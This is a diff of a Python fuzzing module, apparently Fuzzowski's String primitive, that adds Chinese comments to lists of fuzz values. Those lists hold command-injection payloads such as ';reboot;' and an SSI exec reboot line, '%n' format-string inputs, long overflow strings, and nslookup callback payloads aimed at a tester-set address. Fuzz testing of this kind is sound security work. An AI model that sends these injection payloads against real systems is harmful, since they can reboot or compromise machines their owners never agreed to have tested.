@@ -10,16 +10,17 @@ from ...exception import FuzzowskiRuntimeError
 class String(Mutant):
     default_mutation_types = ('instance', 'callback', 'file', 'long', 'commands', 'format', 'misc')
     # store generic mutations as a class variable to avoid copying the structure across each instantiated primitive.
-    _generic_long_mutations = []  # It will be filled in _init_ if it is empty
+    # 将泛型突变存储为类变量，以避免跨每个实例化原语复制结构。
+    _generic_long_mutations = []  # It will be filled in _init_ if it is empty 如果空，在init中填充
 
-    _generic_command_mutations = [
+    _generic_command_mutations = [  # 命令变异，尝试各种不同的，命令
         "|touch /tmp/fuzzowski",
-        ";touch /tmp/fuzzowski;",
+        ";touch /tmp/fuzzowski;",  # 目测是创建文件
         "|notepad",
-        ";notepad;",
+        ";notepad;",  # 打开记事本
         "\nnotepad\n",
         "|reboot",
-        ";reboot;",
+        ";reboot;",  # 重启
         "\nreboot\n",
 
         # fuzzdb command injection
@@ -91,11 +92,11 @@ class String(Mutant):
         "& reboot",
         "| reboot",
         "FAIL||CMD=$'reboot';$CMD",
-        "<!--#exec cmd=\"reboot\"-->",
+        "<!--#exec cmd=\"reboot\"-->",  # 应该都是在执行重启操作
         "reboot;",
     ]
 
-    _generic_format_mutations = [
+    _generic_format_mutations = [  # 格式化字符串变异
         "%n" * 100,
         "%n" * 500,
         "\"%n\"" * 500,
@@ -104,9 +105,10 @@ class String(Mutant):
         "\"%s\"" * 500
     ]
 
-    _generic_misc_mutations = [
+    _generic_misc_mutations = [  # 主要是杂项部分。
         "",
         # strings ripped from spike (and some others I added)
+        # 从spike中拿来的字符串
         "/.:/" + "A" * 5000 + "\x00\x00",
         "/.../" + "B" * 5000 + "\x00\x00",
         "/.../.../.../.../.../.../.../.../.../.../",
@@ -140,7 +142,7 @@ class String(Mutant):
         "<>" * 500  # sendmail crackaddr (http://lsd-pl.net/other/sendmail.txt)
     ]
 
-    _generic_callback_payloads = [
+    _generic_callback_payloads = [  # 回调payload  nslookup:查询DNS
         '/usr/bin/env nslookup %s;',
         ' | /usr/bin/env nslookup %s;',
         '\n/usr/bin/env nslookup %s;',
@@ -246,20 +248,27 @@ class String(Mutant):
                  mutation_types: Iterable = default_mutation_types):
         """
         Primitive that cycles through a library of "bad" strings.
+        循环遍历bad 字符串库的原语
         The class variables '_generic_*_mutations' contain a list of smart fuzz values global across all instances.
+        类变量'_generic_*_mutations'包含所有实例的全局smart fuzz值列表。
         The '_instance_mutations' variable contains fuzz values specific to the instantiated primitive.
+        类变量'_generic_*_mutations'包含所有实例的全局smart fuzz值列表。
         This allows us to avoid copying the near ~70MB generic_mutations data structure across each instantiated String.
+        这允许我们避免跨每个实例化字符串复制近70MB的generic_mutations数据结构。
 
         Args:
             value:          Original string value
             name:           Primitive name
-            size:           (Optional, def=-1) Static size of this field, leave -1 for dynamic.
+            size:           (Optional, def=-1) Static size of this field, leave -1 for dynamic. -1为了动态变化
             padding:        (Optional, def="\\x00") Value to use as padding to fill static field size.
+                            使用"\x00" 来填充静态数据域大小之外的空白
             encoding:       (Optional, def="utf-8") String encoding, ex: utf_16_le for Microsoft Unicode.
             fuzzable:       (Optional, def=True) Enable/disable fuzzing of this primitive
             max_len:        (Optional, def=-1) Maximum string length
             callback_addr:  (Optional, def=None) Specifying a callback addr will inject ping and nslookup commands
+                            注入ping以及DNS查询
             filename:       (Optional, def=None) Specifying a filename will replace mutations with the filename ones
+                            会使用指定的文件名来替换变异
             mutation_types: (Optional, def=('instance', 'callback', 'file', 'long', 'commands', 'format', 'misc'))
                             Types of mutations to use for this String:
                                 instance: Specific mutations based in the default value
@@ -411,7 +420,7 @@ class String(Mutant):
         """
         for cmd in self._generic_callback_payloads:
             self._callback_mutations.append(str(self._original_value + bytes(cmd % callback_addr, 'utf-8'),
-                                            'utf-8'))
+                                                'utf-8'))
 
         if replace:
             self._mutation_types = []
@@ -444,7 +453,7 @@ class String(Mutant):
             all_mutations.append(self._generic_format_mutations)
         if 'misc' in self._mutation_types:
             all_mutations.append(self._generic_misc_mutations)
-        return list(itertools.chain(*all_mutations))   # This will copy the lists... :(
+        return list(itertools.chain(*all_mutations))  # This will copy the lists... :(  需要改进
 
     def _render(self, value) -> bytes:
         """
@@ -481,5 +490,3 @@ class String(Mutant):
 
         self._mutation_types = types_list
         self._mutations = self.get_all_mutations()  # Update mutations list
-
-
